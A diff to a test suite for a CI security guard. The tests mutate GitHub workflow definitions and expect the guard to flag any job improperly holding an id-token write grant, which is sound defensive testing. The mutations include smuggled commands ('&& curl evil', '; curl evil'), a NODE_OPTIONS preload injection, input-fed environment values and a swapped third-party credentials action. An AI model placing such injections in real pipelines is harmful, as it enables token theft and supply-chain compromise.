@@ -213,33 +213,35 @@ describe('the mutations: any other job holding id-token turns the guard red, by 
   // Plan 0002 S7: the telemetry collector's job is one of the holders outside the QA store's, and
   // only in its exact shape.
   it('any other job of telemetry-collect.yml given id-token: write', () => {
-    expect(mutate((w) => grant(job(w, 'telemetry-collect.yml', 'unset'))))
-      .toEqual(['telemetry-collect.yml: job unset holds id-token: write (its own permissions grant); only a job that runs the qa-store block alone, the store maintenance job, the telemetry collector job, the aggregate read job, the Overseer telemetry read job or the metrics page read job, may']);
+    // The store admits a token from this workflow at a release whichever of its jobs minted it
+    // (plan 0008 §2.2), so a second holder there is exactly what the guard must catch.
     expect(mutate((w) => {
       const wf = w['telemetry-collect.yml']!;
       wf.jobs.extra = { ...structuredClone(job(w, 'telemetry-collect.yml', 'collect')) };
     })).toEqual(['telemetry-collect.yml: job extra holds id-token: write (its own permissions grant); only a job that runs the qa-store block alone, the store maintenance job, the telemetry collector job, the aggregate read job, the Overseer telemetry read job or the metrics page read job, may']);
-    // A workflow-level grant reaches the job that declares none.
+    // A workflow-level grant reaches a job that declares none.
     expect(mutate((w) => {
       w['telemetry-collect.yml']!.permissions = { 'id-token': 'write' };
-      delete job(w, 'telemetry-collect.yml', 'unset').permissions;
+      w['telemetry-collect.yml']!.jobs.unset = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'echo hi' }] } as Workflow['jobs'][string];
     })).toEqual(["telemetry-collect.yml: job unset holds id-token: write (it declares no permissions, so it inherits the workflow's); only a job that runs the qa-store block alone, the store maintenance job, the telemetry collector job, the aggregate read job, the Overseer telemetry read job or the metrics page read job, may"]);
   });
 
-  it('the collector job loses its exemption for anything beside its four steps', () => {
+  it('the collector job loses its exemption for anything beside its three steps (plan 0008 J5)', () => {
     const red = ["telemetry-collect.yml: job collect holds id-token: write (its own permissions grant); only a job that runs the qa-store block alone, the store maintenance job, the telemetry collector job, the aggregate read job, the Overseer telemetry read job or the metrics page read job, may",
       "telemetry.yml: job collect holds id-token: write (it declares no permissions, so it inherits the workflow's) and calls telemetry-collect.yml, which has no store job to pass it to"];
     const steps = (w: Record<string, Workflow>) => job(w, 'telemetry-collect.yml', 'collect').steps as Array<{ run?: string; uses?: string; env: Record<string, string> }>;
+    // MUTATION J5 names: a fourth step in the collect job.
     expect(mutate((w) => { steps(w).push({ run: 'echo hi', env: {} }); })).toEqual(red);
-    expect(mutate((w) => { steps(w)[3]!.run = 'node "$KANON/scripts/telemetry-collect.mjs" && curl evil'; })).toEqual(red);
-    expect(mutate((w) => { steps(w)[3]!.env.NODE_OPTIONS = '-r x'; })).toEqual(red);
+    expect(mutate((w) => { steps(w)[2]!.run = 'node "$KANON/scripts/telemetry-collect.mjs" && curl evil'; })).toEqual(red);
+    expect(mutate((w) => { steps(w)[2]!.env.NODE_OPTIONS = '-r x'; })).toEqual(red);
     expect(mutate((w) => { steps(w)[0]!.uses = './.github/actions/kanon-path'; })).toEqual(red);
-    expect(mutate((w) => { steps(w)[2]!.uses = 'someone/configure-aws-credentials@v6'; })).toEqual(red);
-    // The mask step (kanon#514) runs Kanon's script with the role alone, and nothing else.
-    expect(mutate((w) => { steps(w)[1]!.run = 'node "$KANON/scripts/telemetry-collect.mjs" mask; curl evil'; })).toEqual(red);
+    // The inputs' check runs Kanon's script with the store's inputs by name, and nothing else.
+    expect(mutate((w) => { steps(w)[1]!.run = 'node "$KANON/scripts/telemetry-collect.mjs" check; curl evil'; })).toEqual(red);
     expect(mutate((w) => { steps(w)[1]!.env.NODE_OPTIONS = '-r x'; })).toEqual(red);
-    expect(mutate((w) => { steps(w)[1]!.env.ROLE = '${{ inputs.url }}'; })).toEqual(red);
+    expect(mutate((w) => { steps(w)[1]!.env.LEGACY = '${{ inputs.writer-role }}'; })).toEqual(red);
     expect(mutate((w) => { steps(w).splice(1, 1); })).toEqual(red);
+    // An AWS credentials step back in the job is not the collector's shape any more.
+    expect(mutate((w) => { steps(w).splice(2, 0, { uses: 'aws-actions/configure-aws-credentials@v6', env: {} }); })).toEqual(red);
     expect(mutate((w) => { (job(w, 'telemetry-collect.yml', 'collect') as Record<string, unknown>).env = { NODE_OPTIONS: '-r x' }; })).toEqual(red);
     expect(mutate((w) => { (job(w, 'telemetry-collect.yml', 'collect') as Record<string, unknown>).container = 'node:24'; })).toEqual(red);
     // The same job under another name, or in another workflow, is not the collector.
